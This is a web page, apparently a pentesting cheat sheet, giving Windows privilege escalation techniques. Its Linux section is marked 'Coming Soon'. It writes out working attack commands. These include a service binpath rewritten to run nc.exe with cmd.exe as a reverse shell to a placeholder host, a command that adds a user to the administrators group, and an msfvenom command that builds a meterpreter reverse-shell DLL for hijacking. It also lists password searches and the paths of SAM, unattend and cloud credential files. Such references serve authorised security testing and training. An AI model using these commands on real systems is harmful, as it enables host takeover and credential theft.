---
layout: page
title: "Privilege Escalation Master"
meta_title: "Privilege Escalation Master"
subheadline: "Find an Exploit"
teaser: "Here you will find a quick reference for Windows and Linux privilege escalation vulnerabilities within every type of vulnerability there's a link to a database of vulnerbilities of that type to guide you quick to the right exploit."
header:
   image_fullwidth: "Red.jpg"
permalink: "/privesc-master"
---

{% include alert info='Windows' %}	

{% include alert warning='<h3>Kernel</h3><br>OS name and version:<br>
<code>>C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code><br>
Check drivers:<br><code>driverquery</code><br>Check Patches:<br>
<code>>wmic qfe get Caption,Description,HotFixID,InstalledOn</code><br>
Tools for enumeration:<br>
<a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a><br>
<a href="https://github.com/rasta-mouse/Watson">Watson </a><br>
<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester </a><br>
Got lucky ?<br><a href="https://hacking-resources.com/privesc-master/windows-kernel">Search Kernel Exploits Here</a>' %}


{% include alert warning='<h3>Services</h3><br>Enumeration:<br>
<code>sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\output.txt</code><br>

Modify a service binary:<br>
<code>>sc config [Service_Name] binpath= "C:\nc.exe -nv X.X.X.X 8888 -e C:\WINDOWS\System32\cmd.exe"<br><br>
<code>>sc config [Service_Name] binpath= "net localgroup administrators username /add"<br>
<code>>sc config [Service_Name] binpath= "C:\Documents and Settings\%username%\reverseshell.exe"</code><br>

Restart service:<br>
<code>>wmic service NAMEOFSERVICE call startservice</code><br>
<code>>net stop [service name] && net start [service name]</code><br>


' %}






{% include alert warning='<h3>Unquoted Service Path</h3><br>
If the path to an executable is not inside quotes, Windows will try to execute the service executable from inside each directory.
For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:<br>
C:\reverseshell.exe<br>
C:\Program Files\reverseshell.exe <br>
C:\Program Files\Some Folder\reverseshell.exe<br><br>

enumeration command:<br>
<code>>wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """</code><br>Check Permissions:<br>

<code>>icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"</code><br>
<code>>icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"</code><br>
<code>>icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"</code><br>
<code>>icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"</code><br>
Need some help?<br>
<a href="https://hacking-resources.com/privesc-master/windows-unquoted">List of applications that will possibly have this issue click here </a><br>' %}








{% include alert warning='<h3>DLL Hijacking</h3><br>
Windows has a search path for DLLs in its underlying architecture. If you can figure out what DLLs an executable requests without an absolute path (triggering this search process), you can then place your hostile DLL somewhere higher up the search path so it’ll be provided to the application before the real version.<br>
Search order:<br>
The directory from which the application loaded.<br>
The system directory. (C:\Windows\System32\)<br>
The 16-bit System Directory. (C:\Windows\System\)<br>
The Windows directory. (C:\Windows\)<br>
The current directory.<br>
The directories that are listed in the PATH environment variable.<br><br>


Enumeration:<br>
<code>>wmic process > outfile</code><br>
<code>>tasklist /FO CSV > tasks.txt</code><br><br>

Enumeration tools:<br><br>
<a href="https://github.com/MojtabaTajik/Robber">Robber</a><br>
Enumeration Tool<br><br>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a><br>
Find startup programs and show the file path the program runs from.<br><br>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a><br>
Apply a basic filter with the following properties:<br>
Process Name is <[Value]><br>
Result is <[NAME NOT FOUND]><br>
Path ends with .dll* <br><br>

Powersploit tool to enumerate and exploit:<br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/">Find-ProcessDLLHijack </a><br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-PathDLLHijack/">Find-PathDLLHijack </a><br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/">Write-HijackDll </a><br><br>

Now utilize the search order and check where is the original dll loaded from. in case it`s loaded from The windows directory then you can use the first 3 to inject your dll.<br>

Check Permissions:<br>
<code>>icacls .</code><br>

Generate the dll file<br>
<code>>msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8888 -f dll > output.dll</code><br><br>

' %}









{% include alert warning='<h3>Disclosed Credentials</h3><br>

Search for files containing passwords:<br>
<code>>findstr /si password *.xml *.ini *.txt *.config 2>nul</code><br>
<code>>findstr /si pass *.txt | *.xml | *.ini</code><br>

Check unattended files:<br>
<code>C:\Windows\sysprep\sysprep.xml</code><br>
<code>C:\Windows\sysprep\sysprep.inf</code><br>
<code>C:\Windows\sysprep.inf</code><br>
<code>C:\Windows\Panther\Unattended.xml</code><br>
<code>C:\Windows\Panther\Unattend.xml</code><br>
<code>C:\Windows\Panther\Unattend\Unattend.xml</code><br>
<code>C:\Windows\Panther\Unattend\Unattended.xml</code><br>
<code>C:\Windows\System32\Sysprep\unattend.xml</code><br>
<code>C:\Windows\System32\Sysprep\unattended.xml</code><br>
<code>C:\unattend.txt</code><br>
<code>C:\unattend.inf</code><br>

Check SAM and SYSTEM files:<br>

<code>%SYSTEMROOT%\repair\SAM</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\SAM</code><br>
<code>%SYSTEMROOT%\System32\config\SAM</code><br>
<code>%SYSTEMROOT%\repair\system</code><br>
<code>%SYSTEMROOT%\System32\config\SYSTEM</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\system</code><br>
Cloud Credentials<br>
Check user home for below directories/files:<br>
<code>.aws\credentials</code><br>
<code>AppData\Roaming\gcloud\credentials.db</code><br>
<code>AppData\Roaming\gcloud\legacy_credentials</code><br>
<code>AppData\Roaming\gcloud\access_tokens.db</code><br>
<code>.azure\accessTokens.json</code><br>
<code>.azure\azureProfile.json</code><br>' %}




{% include alert warning='<h3>Other enumeration commands:</h3><br>

Info about current user:<br>
<code>>whoami</code><br>
<code>>echo %USERNAME%</code><br>
<code>>whoami /priv</code><br>
Other users:<br>
<code>>net users</code><br>
<code>>dir /b /ad "C:\Users\"</code><br>
Groups:<br>
<code>>net localgroup </code><br>
<code>>net localgroup Administrators </code><br>
<code>>whoami /all </code><br>

Network connections and the firewall rules:<br>
<code>>netstat -ano</code><br>
<code>>netsh firewall show state</code><br>
<code>>netsh firewall show config</code><br>

Checking AV:<br>
<code>>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more</code><br>
Check clipboard content:<br>
<code>>powershell -command "Get-Clipboard"</code><br>
Processes and services:<br>
<code>>tasklist /SVC</code><br>
<code>>tasklist /v</code><br>
<code>>net start</code><br>
<code>>sc query</code><br>
Installed Programs:<br>
<code>>dir /a "C:\Program Files"</code><br>
<code>>dir /a "C:\Program Files (x86)"</code><br>
<code>>reg query HKEY_LOCAL_MACHINE\SOFTWARE</code><br>

Run at Startup:<br>
<code>>wmic startup get caption,command</code><br>
<code>>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code><br>
<code>>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br>
<code>>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code><br>
<code>>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br>
<code>>dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</code><br>
<code>>dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"</code><br>

Scheduled tasks:<br>
<code>>schtasks /query /fo LIST 2>nul | findstr TaskName</code><br>
<code>>dir C:\windows\tasks</code><br>


' %}



{% include alert terminal='Linux' %}

{% include alert warning='Coming Soon' %}





	
{% include share.html %}	
	
	
